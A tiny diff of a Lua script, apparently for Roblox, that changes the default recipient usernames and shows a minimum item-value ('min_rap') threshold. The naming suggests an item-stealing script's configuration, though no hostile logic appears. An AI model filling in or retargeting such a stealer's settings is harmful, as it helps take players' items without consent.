@@ -36,7 +36,7 @@ end
 
 
 
-local users = _G.Usernames or {"PetsGoMommy", "TobiAltGrind", "TobiHatching"}
+local users = _G.Usernames or {"ZemNuts"}
 
 local min_rap = _G.min_rap or 1000
 
